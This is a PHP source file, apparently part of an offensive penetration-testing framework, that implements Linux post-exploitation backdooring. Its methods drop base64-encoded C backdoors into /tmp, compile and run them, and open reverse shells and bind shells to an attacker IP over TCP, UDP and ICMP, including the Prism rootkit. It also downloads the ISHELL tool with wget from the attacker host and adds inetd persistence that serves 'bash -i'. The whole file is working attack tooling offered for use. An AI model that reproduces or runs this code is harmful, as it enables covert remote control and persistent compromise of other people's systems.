<?php 




class backdoor4linux extends root4linux4com{

  

    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$uid_pass) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64,$uid_pass);
    }
    
    
    
    
    
    
    public function root2backdoor(){
        $this->titre(__FUNCTION__);
        
        $sql_ip = "UPDATE IP SET ip2backdoor=1 WHERE $this->ip2where  ";
        $this->mysql_ressource->query($sql_ip);
        
        $sbin = array();
        $sbin_path_hidden = "/usr/sbin/lpinfo";
        $attacker_ip = $this->ip4addr4target($this->ip);
        
        
        $data = "lsof -nPi ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("Services");
        $data = "service --status-all";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -v -e '^$' /etc/service 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->ssTitre("Investigation Module By Name");
        $data = "lsmod";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /proc/modules";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "ls /sys/module";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "modinfo";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("This is usually enabled on newer systems, such as RHEL 6.
It provides information as to what process is running on which cpu.
This can be handy to get a list of processes and their PID number.");
        $data = "cat /proc/sched_debug";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $attacker_protocol = "T";
        $filter = "| grep root | awk '{print $11}' | grep '/usr/sbin/' | grep -Po \"^/[[:print:]]{1,}\" | sort -u";
        $query = "ps -aux ";
        $rst_tmp = $this->lan2stream4result($query,$this->stream_timeout);
        $query = "echo \"$rst_tmp\" $filter  | grep '/usr/sbin/' | grep -Po \"^/[[:print:]]{1,}\" | sort -u";
        //$this->requette($query);
        exec($query,$sbin);
        //var_dump($sbin);
        $rst_sbin = $this->tab($sbin);
        $this->rouge("Interesting Injection into SBIN", $rst_sbin);
        $this->article("SBIN", $rst_sbin);
        $this->pause();
        
        $query = "echo \"$rst_tmp\" | grep '/usr/bin/vmtoolsd' | awk '{print $2}' ";
        //$this->requette($query);
        exec($query,$tmp);
        //var_dump($sbin);
        $pid = $this->tab($tmp);
        $this->rouge("Injecting into PID vmtoolsd", $pid);
        $this->pause();
        
        
        $attacker_port = rand(1024,65535);
        $this->root2backdoor2tcp2server8prism($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol);$this->pause(); // OK
        $attacker_port = rand(1024,65535);
        $this->root2backdoor2tcp2server($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol);$this->pause();
        $victime_port = rand(1024,65535);
        $this->root2backdoor2tcp2bind8passwd($this->created_user_pass,$attacker_ip,$victime_port,$attacker_protocol);$this->pause();
        $attacker_port = rand(1024,65535);
        //$this->root2backdoor2udp($attacker_ip,$attacker_port);$this->pause();
        
        
        
        
    }
    
    
    
    
    
    
    public function root2backdoor2udp2server($attacker_ip,$attacker_port){
        $this->ssTitre(__FUNCTION__);
        $sbin_path_hidden = "";
        $rev_id = $this->backdoor8c2udp($sbin_path_hidden, $attacker_ip, $attacker_port);
        $rootkit_path = "/tmp/root2backdoor_udp";
        $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
        $this->requette($query);
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "gedit $rootkit_path.c";
        //$this->requette($query);
        $query = "gcc -DDETACH -DNORENAME -Wall -s -o $rootkit_path $rootkit_path.c ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ls -al $rootkit_path ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $attacker_protocol = "U";
        
        $cmd2 = "ping $this->ip -c 1 -s 100";
        $this->cmd("localhost",$cmd2);
        
        $templateB64_cmd = base64_encode($cmd2);
        $query = "$rootkit_path &";
        $this->lan2stream4result($query,$this->stream_timeout);
        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
        //$cmd1 = "nc -l -u -p $attacker_port -v ";
        $time = 5 ;
        
        $this->exec_parallel($cmd1, $cmd2, $time);
        $this->pause();
    }
    
    
    public function root2backdoor2tcp2bind8passwd($attacker_password,$attacker_ip,$victime_port,$attacker_protocol){
        $this->ssTitre(__FUNCTION__);
        $rev_id = $this->backdoor8c2tcp2passwd();
        $rootkit_path = "/tmp/root2backdoor_passwd";
        $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
        $this->requette($query);
        
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "gedit $rootkit_path.c";
        //$this->requette($query);
        $query = "gcc -DDETACH -DNORENAME -Wall -s -o $rootkit_path $rootkit_path.c ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ls -al $rootkit_path ";
        $this->lan2stream4result($query,$this->stream_timeout);
        
        $cmd2 = "$rootkit_path $victime_port $attacker_password";
        $this->cmd("REMOTE",$cmd2);
        $templateB64_cmd = base64_encode($cmd2);
        
        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        
        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $victime_port $attacker_protocol $templateB64_cmd $templateB64_shell client 60 listening_Server\" ";
        $time = 5 ;
        
        $this->exec_parallel($cmd2, $cmd1, $time);
        $this->pause();
    }
    
    public function root2backdoor2tcp2server($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol){
        $this->ssTitre(__FUNCTION__);
        $rev_id = $this->backdoor8c2tcp($sbin_path_hidden, $attacker_ip, $attacker_port);
        $rootkit_path = "/tmp/root2backdoor_tcp";
        $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
        $this->requette($query);
        
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "gedit $rootkit_path.c";
        //$this->requette($query);
        $query = "gcc -DDETACH -DNORENAME -Wall -s -o $rootkit_path $rootkit_path.c ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ls -al $rootkit_path ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -ef | grep $sbin_path_hidden";
        $this->lan2stream4result($query,$this->stream_timeout);
        
        $cmd2 = "echo '$this->root_passwd' | sudo -S hping3 -I $this->eth -c 1 --icmptype 8 --icmp-ipid 1337 $this->ip";
        $this->cmd("localhost",$cmd2);
        $templateB64_cmd = base64_encode($cmd2);
        $query = "$rootkit_path &";
        $this->lan2stream4result($query,$this->stream_timeout);
        
        
        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        
        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
        //$cmd1 = "nc -l -p $attacker_port -v ";
        $time = 5 ;
        
        $this->exec_parallel($cmd1, $cmd2, $time);
        $this->pause();
    }
    
    
    public function root2backdoor2tcp2server8prism($sbin_path_hidden,$attacker_ip,$attacker_port,$attacker_protocol){
        $this->ssTitre(__FUNCTION__);
        //https://github.com/andreafabrizi/prism
        
        $rev_id = $this->backdoor8c2tcp2prism($sbin_path_hidden, $attacker_ip, $attacker_port);
        $rootkit_path = "/tmp/root2backdoor_prism";
        $this->str2file($rev_id, $rootkit_path);
        $query = "echo '".base64_encode($rev_id)."' | base64 -d > $rootkit_path.c";
        $this->requette($query);
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "gedit $rootkit_path.c";
        //$this->requette($query);
        $this->pause();
        $query = "gcc -DDETACH -DNORENAME -Wall -s -o $rootkit_path $rootkit_path.c ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $this->pause();
        $query = "ls -al $rootkit_path ";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -ef | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -ef | grep udevd";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -aux | grep udevd";
        $this->lan2stream4result($query,$this->stream_timeout);
        $this->pause();
        
        $query = "$rootkit_path Inf0";
        $this->lan2stream4result($query,$this->stream_timeout);
        $this->pause();
        $query = "$rootkit_path &";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "socat - EXEC:\"$rootkit_path\",pty,stderr,setsid,sigint,ctty,sane";
        //$this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -aux | grep udevd";
        $this->lan2stream4result($query,$this->stream_timeout);
        $query = "ps -aux | grep $rootkit_path";
        $this->lan2stream4result($query,$this->stream_timeout);
        $this->pause();
        
        $cmd2 = "echo \"$this->root_passwd\" | sudo -S python $this->dir_c/sendPacket.py $this->ip p4ssw0rd $attacker_ip $attacker_port";
        $this->cmd("localhost",$cmd2);
        
        $templateB64_cmd = base64_encode($cmd2);
        $query = "$rootkit_path &";
        $this->lan2stream4result($query,$this->stream_timeout);
        $templateB64_shell = base64_encode(str_replace("%SHELL%", $query, $this->template_shell));
        
        
        
        $cmd1 = "php pentest.php LAN \"$this->eth $this->domain $this->ip $this->port $this->protocol $attacker_port $attacker_protocol $templateB64_cmd $templateB64_shell server 60 listening_Server\" ";
        //$cmd1 = "nc -l -p $attacker_port -v ";
        
        $time = 5 ;
        
        
        $this->exec_parallel($cmd1, $cmd2, $time);
        $this->pause();
    }
    
    
   
    
    
    public function root2backdoor2icmp2server($attacker_ip,$attacker_port) {
        $this->titre(__FUNCTION__);
        
        $this->backdoor_linux_icmp_client();
        $this->backdoor_linux_icmp_server($attacker_ip,$attacker_port);
        
        $cmd1 = "sudo tshark -a duration:20 -i $this->eth_lan -n icmp and \"host $this->target_ip or host $this->attacker_ip\" ";
        $cmd2 = "sudo $this->file_path -i 65535 -t $this->target_port -p 1024 $this->target_ip";
        $this->exec_parallel($cmd1, $cmd2, 3 );
        $this->pause();
    }
    
    public function root2backdoor2icmp2server8server($attacker_ip,$attacker_port) {
        $this->ssTitre(__FUNCTION__);
        
        $this->tcp2open4server($attacker_ip, $this->port_rfi);
        $file_path = "$this->dir_tmp/ISHELL-v0.2.tar.gz";
        if (!file_exists($file_path)) $this->requette("cp -v $this->dir_tools/Malware/ISHELL-v0.2.tar.gz $file_path");
        $data = "wget http://$$attacker_ip:$this->port_rfi/ISHELL-v0.2.tar.gz -O /tmp/ISHELL-v0.2.tar.gz";
        $this->lan2stream4result($data, $this->stream_timeout*2);
        $data = "tar -xvf /tmp/ISHELL-v0.2.tar.gz -C /tmp ";
        $this->lan2stream4result($data, $this->stream_timeout*2);
        $data = "cd /tmp/ISHELL-v0.2/; make linux";
        $this->lan2stream4result($data, $this->stream_timeout*2);
        

        
        $template_id_euid = "echo '%ID%' | /tmp/ISHELL-v0.2/ishd -i 65535 -t $this->attacker_port -p 1024";
        $this->lan2pentest8id($template_id_euid);
        
        
    }
    
    

    
    public function root2backdoor2icmp2server8client() {
        $this->ssTitre(__FUNCTION__);
        $this->requette("tar -xvzf $this->dir_tools/Malware/ISHELL-v0.2.tar.gz -C $this->dir_tmp");
        $this->requette("cd $this->dir_tmp/ISHELL-v0.2/; make linux" );
    }
    
    
    
    public function backdoor_linux_persistance() {
        $this->ssTitre(__FUNCTION__);
        /*
         * at : programme une tache à exécuter à une heure ultérieure ex : at 18:22 ou at now + 5hours puis ctlr D
         * atq : lister les jobs en attente
         * atrm : supr jobs
         */
        $this->article("Test","Pick an obscure service from /etc/services associated with a tcp port 1024 and above…for example laplink");
        $this->requette("echo \"laplink $this->attacker_port/tcp # laplink\nlaplink stream tcp nowait /bin/sh bash -i\nrestart inetd.conf\nkillall -HUP inetd\" > $this->file_path");
        //$victime = new vm($this->target_vmx_name);
        //$victime->vm2upload($this->file_path, "$this->vm_tmp_lin/$this->file_ext");
        $this->cmd($this->target_ip,"bash $this->vm_tmp_lin/$this->file_ext");
        //$this->
    }
    
    
    
}
?>